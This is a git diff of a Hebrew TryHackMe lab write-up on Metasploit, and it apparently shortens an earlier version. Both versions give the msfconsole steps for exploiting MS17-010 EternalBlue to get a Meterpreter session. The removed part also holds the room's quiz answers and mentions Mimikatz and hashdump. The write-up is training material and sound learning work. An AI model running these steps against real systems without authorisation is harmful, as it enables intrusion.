@@ -1,230 +1,157 @@
-🛡️ Penetration Test Report — Metasploit Introduction
+🛡️ דוח PT – Metasploit Introduction
 
-Prepared by: Eylon Maayan
-Platform: TryHackMe – Metasploit: Introduction
-Date: 2025
+מאת: אילון מעיין
+פלטפורמה: TryHackMe
+שנה: 2025
 
-📌 1. Executive Summary
+<img width="1000" height="659" alt="image" src="https://github.com/user-attachments/assets/3ac11a78-0422-4b28-b9a5-3d510b8df263" />
 
-מטרת התרגול הייתה להכיר את מסגרת Metasploit, להבין את יכולותיה, ולתרגל תהליך תקיפה מלא:
-איתור חולשה, בחירת exploit, התאמת פרמטרים, שליחת payload וקבלת שליטה (Session) על המערכת.
+מטרת התרגול הייתה ללמוד את מסגרת Metasploit, להבין את סוגי המודולים, ולהתנסות בתהליך תקיפה מלא כולל:
 
-במהלך התרגול בוצע ניצול של חולשת MS17-010 (EternalBlue), שימוש ב־msfconsole, הבנת סוגי המודולים, ביצוע סריקות, והבנת שלבי ה־post-exploitation.
+איתור חולשה
 
-החדר מהווה שלב נוסף בדרך לבניית מיומנויות התקפה והגנה כבסיס לקריירה ב־Cyber Defense / SOC.
+בחירת exploit
 
-📌 2. Scope
+הגדרת פרמטרים
 
-הדוח עוסק:
+שליחת payload
 
-במבנה Metasploit Framework
+קבלת Session
 
-סוגי מודולים (Exploits, Payloads, Auxiliary וכו')
+ניהול Post-Exploitation
 
-תהליך העבודה בכלי
+בתרגול נוצלה חולשת MS17-010 EternalBlue על מכונת Windows 7.
+החדר מחזק הבנה מעשית של תקיפה ריאלית ומהווה נדבך חשוב להכשרה כאנליסט סייבר.
 
-שימוש ב־EternalBlue לניצול חולשה
+📌 2. היקף (Scope)
 
-ניהול Sessions
+הדוח כולל:
 
-מענה על כל השאלות שניתנו בחדר
+מבנה Metasploit Framework
 
-📌 3. Objectives
+הסבר קצר על סוגי המודולים
 
-להבין את מבנה Metasploit ואת ה־modules שלו
+שימוש ב־msfconsole
 
-ללמוד כיצד לחפש ולבחור exploit מתאים
+חיפוש מודולים (search)
 
-להגדיר פרמטרים: RHOSTS, LHOST, PAYLOAD
+טעינת מודול (use)
 
-לבצע ניצול מוצלח של MS17-010
+הגדרת פרמטרים (set / setg)
 
-לנתח פלטים ולנהל sessions
+ניצול EternalBlue
 
-להבין תהליך PT אמיתי — מהתחלה עד קבלת Shell
+ניהול sessions
 
-📌 4. Technical Overview
-🔹 4.1 Components of Metasploit
+📌 3. יעדי התרגול
 
-Metasploit מורכב מארבע תת-מערכות מרכזיות:
+להבין את המבנה והמודולים של Metasploit
 
-רכיב	תפקיד
-msfconsole	הממשק הראשי לביצוע תקיפות
-Modules	יחידות קטנות המממשות פעולה (Exploit, Auxiliary וכו')
-Payloads	קוד שרץ על היעד לאחר ניצול
-Tools	כלים עצמאיים (msfvenom וכו')
-סוגי מודולים:
+ללמוד לאתר exploits ולבחור פיילוד מתאים
 
-Exploit – קוד המנצל חולשה
+להגדיר פרמטרים כמו RHOSTS/LHOST
 
-Payload – Shell / Command / Reverse TCP
+לבצע ניצול מוצלח של חולשה אמיתית
 
-Auxiliary – סורקים, פאזרים, מידע
+לקבל shell ולהפעיל פקודות על היעד
 
-Encoders – ניסיון לעקיפת AV
+להבין ניהול סשנים ו־post-exploitation
 
-Evasion – מודולים ייעודיים לעקיפת הגנות
+📌 4. מבט טכני קצר על Metasploit
+🔹 4.1 מרכיבי המסגרת
+רכיב	משמעות
+msfconsole	הממשק המרכזי בו עובדים
+Modules	יחידות פעולה: Exploit, Payload, Scanner וכו'
+Payloads	קוד שרץ על היעד (Reverse shell, Meterpreter וכו')
+Tools	כלים נוספים כמו msfvenom, pattern_create
+🔹 4.2 סוגי מודולים בקצרה
 
-NOPs – ריפוד (0x90)
+Exploit – מנצל חולשה קיימת במערכת
 
-Post – איסוף מידע לאחר פריצה
+Payload – קוד שמופעל לאחר הניצול
 
-📌 5. Metasploit Concepts
-Exploit
+Auxiliary – סריקות, brute-force, בדיקות
 
-קוד המנצל חולשה קיימת.
+Encoders – ניסיון לעקיפת אנטי־וירוס
 
-Vulnerability
+Evasion – מודולים מתקדמים לעקיפת הגנות
 
-טעות תכנות/עיצוב שמאפשרת ניצול.
+NOPs – פקודות “ריקות” לייצוב מבנה פיילוד
 
-Payload
+Post – איסוף מידע על המערכת לאחר הפריצה
 
-הקוד שרץ על היעד ונותן שליטה לתוקף.
-
-Session
-
-ערוץ שליטה במערכת לאחר הצלחת exploit.
-
-📌 6. Tools & Commands Used
-הפעלת msfconsole
+📌 5. מושגים בסיסיים (בקצרה)
+מושג	הסבר
+Vulnerability	חולשה/באג במערכת
+Exploit	קוד שמנצל את החולשה
+Payload	מה שרץ על המערכת אחרי ההצלחה
+Session	ערוץ תקשורת שנפתח אחרי הניצול
+📌 6. פקודות עיקריות
+הפעלת msfconsole:
 msfconsole
 
-חיפוש מודולים
+חיפוש מודולים:
 search ms17-010
 search apache
 search type:auxiliary ssh
 
-טעינת מודול
+טעינת exploit:
 use exploit/windows/smb/ms17_010_eternalblue
 
-הצגת פרמטרים
+הצגת אפשרויות:
 show options
+<img width="778" height="567" alt="image" src="https://github.com/user-attachments/assets/e1ea3cdc-23ba-4802-b5ce-0daaab258610" />
 
-הגדרת פרמטרים
-set RHOSTS 10.10.X.X
-set LHOST 10.10.X.X
+
+הגדרת פרמטרים:
+set RHOSTS <target-ip>
+set LHOST <attackbox-ip>
 set LPORT 4444
 
-הגדרת ערך גלובלי
-setg RHOSTS 10.10.X.X
+הגדרה גלובלית:
+setg RHOSTS <ip>
 
-ניקוי ערך
+ניקוי ערך:
 unset PAYLOAD
 
-הרצת exploit
+הרצת exploit:
 exploit
 
-
-או:
-
-run
-
-ניהול Sessions
+ניהול sessions:
 sessions
 sessions -i 1
 background
 
-📌 7. EternalBlue Exploitation (MS17-010)
+ניקוי מסך בתוך Metasploit:
+CTRL + L
 
-ניצול החולשה כלל:
+📌 7. ניצול EternalBlue — סיכום מעשי
 
 טעינת המודול:
 
 use exploit/windows/smb/ms17_010_eternalblue
 
 
-הגדרת כתובת היעד:
+הגדרת RHOSTS:
 
 set RHOSTS <victim-ip>
 
 
-בדיקת המידע:
+בדיקת דרישות:
 
 show options
 
 
-ביצוע exploit:
+הרצת exploit:
 
 exploit
 
 
-קבלת Meterpreter Session:
+קבלת Meterpreter:
 
 meterpreter >
 
 
-העברת הסשן לרקע:
+יציאה לרקע:
 
 background
-
-📌 8. Answers to Room Questions
-✔ What is the name of the code taking advantage of a flaw on the target system?
-
-Exploit
-
-✔ What is the code that runs on the target system?
-
-Payload
-
-✔ What are self-contained payloads called?
-
-Singles
-
-✔ Is windows/x64/pingback_reverse_tcp single or staged?
-
-Staged
-
-✔ Search for a module related to Apache
-
-search apache
-
-✔ Who provided the ssh_login module?
-
-todb
-
-✔ Set LPORT to 6666
-set LPORT 6666
-
-✔ Set global RHOSTS to 10.10.19.23
-setg RHOSTS 10.10.19.23
-
-✔ Clear a payload
-unset PAYLOAD
-
-✔ Command to execute the exploit
-exploit
-
-📌 9. Conclusions
-
-החדר הדגים את שלבי העבודה המעשיים של תקיפה:
-
-הבנת מבנה Metasploit
-
-זיהוי חולשות
-
-שימוש ב־search למציאת Exploits
-
-הגדרת פרמטרים קריטיים
-
-ביצוע תקיפה מלאה על EternalBlue
-
-קבלת Shell
-
-עבודה עם Meterpreter
-
-זוהי אבן דרך משמעותית נוספת בתהליך ההכשרה שלי כאנליסט סייבר וטכנאי Red Team/Blue Team.
-
-📌 10. Recommendation for Improvement
-
-לבסס הבנה עמוקה יותר:
-
-לעבור לחדר Metasploit Intermediate
-
-לבצע פרויקט PT עצמאי עם Metasploit + Nmap
-
-לתרגל exploitation ב־HackTheBox
-
-ללמוד מודולים כמו Kiwi, Hashdump, Mimikatz
-
-לשלב בין Metasploit + OSINT + Network Scanning
